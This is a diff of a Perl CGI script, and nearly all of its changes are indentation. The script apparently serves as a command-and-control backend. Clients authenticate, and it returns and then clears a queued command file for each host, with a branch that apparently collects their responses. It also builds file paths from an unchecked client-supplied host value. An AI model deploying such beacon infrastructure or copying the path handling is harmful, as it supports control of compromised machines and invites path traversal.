@@ -36,7 +36,7 @@ sub proc_enccmd {
 # generates random string 
 sub rstring {
 
-    my @chr = ("A".."Z", "a".."z");
+	my @chr = ("A".."Z", "a".."z");
 	my $rloop = int(35);
 	my $rstring;
 
@@ -46,9 +46,9 @@ sub rstring {
 		$rstring .= $chr[int(rand(52))];
 		$rloop--;
 		
-    }
+	}
 
-    return $rstring;
+	return $rstring;
 
 }
 
@@ -131,18 +131,17 @@ sub get_param{
 	elsif (defined($q->param('data'))) {
 		
 		# setup authentication here
-        my $get_status = auth_client($q, $pass_file);
-        if ( $get_status eq 'fail' ) { die "[!] fail!\n"; }
-
+        	my $get_status = auth_client($q, $pass_file);
+        	if ( $get_status eq 'fail' ) { die "[!] fail!\n"; }
 		if (!defined($q->param('host'))) { die "[!] no hostname found!\n"; }
 
-	    my $enc_data = $q->param('data');
+		my $enc_data = $q->param('data');
 		my $data = proc_decurl($enc_data);
 
 		my $enc_host = $q->param('host');
 		my $host = proc_decurl($enc_host);
 
-        my $full_path = $cdir . $host;
+        	my $full_path = $cdir . $host;
 		my $filepath = $full_path;
 
 		if ( -e $full_path ) 
@@ -173,21 +172,20 @@ sub get_param{
 		my $stdoutpath = $full_path_stdout;
 
 		if ( -e $full_path_cmd )
-        {
+		{
 			my $code;
 			{
-                open my $fh, '<', $cmdfilepath;
+                		open my $fh, '<', $cmdfilepath;
 					$code = do { local $/; <$fh>};
 				close $fh;
-
 			}
-
-            open(my $fhc, '+>', $cmdfilepath);
+            		open(my $fhc, '+>', $cmdfilepath);
 				print $fhc "\n";
-            close $fhc;
-
-   			$param_out = $code; 
+            		close $fhc;
+   			$param_out = $code;
+			
 		}else { $param_out = 'No hostname found!'; }
+		
 	}
 	elsif (defined($q->param('rsp'))) {
 
